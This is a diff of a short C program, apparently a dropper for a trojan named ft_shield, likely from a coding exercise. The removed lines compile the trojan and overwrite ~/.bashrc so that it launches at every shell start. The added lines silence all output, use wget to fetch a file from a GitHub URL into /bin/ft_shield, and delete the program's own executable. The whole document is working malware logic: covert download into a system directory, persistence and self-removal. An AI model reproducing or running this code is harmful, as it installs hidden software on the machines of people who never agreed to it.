@@ -1,29 +1,27 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <string.h>
+#include <fcntl.h>
 
-int main(int ac, char **av, char **envp) {
+void download_file() {
+    char cmd[256];
+    memset(cmd, 0,256);
+
+    const char *url = "https://raw.githubusercontent.com/HarounKr/ft_shield/refs/heads/master/xor.c";
+    snprintf(cmd, sizeof(cmd), "wget -O /bin/ft_shield %s", url);
+    system(cmd);
+}
+int main(int ac, char **av) {
     (void)ac;
-    (void)av;
-    (void)envp;
-    // char buf[100];
-    char *actualuser = getenv("USER");
-    char *args[] = {
-        "gcc", 
-        "-Wall",
-        "-Wextra",
-        "-Werror", "trojan/*.c", 
-        "-o",
-        "trojan/ft_shield",
-        "-lssl", "-lcrypto", "-lpthread", NULL,
-    };
+    
+    int fd = open("/dev/null", O_RDWR, 0);
+    dup2(fd, STDOUT_FILENO);
+    dup2(fd, STDERR_FILENO);
 
-    fprintf(stdout, "%s\n", actualuser);
-    system("echo /usr/bin/ft_shield > ~/.bashrc");
-    if (execve("/bin/gcc", args,envp) < 0) {
-        perror("execve");
-        return 1;
-    }
-
+    download_file();
+    
+    
+    remove(av[0]);
     return 0;
 }
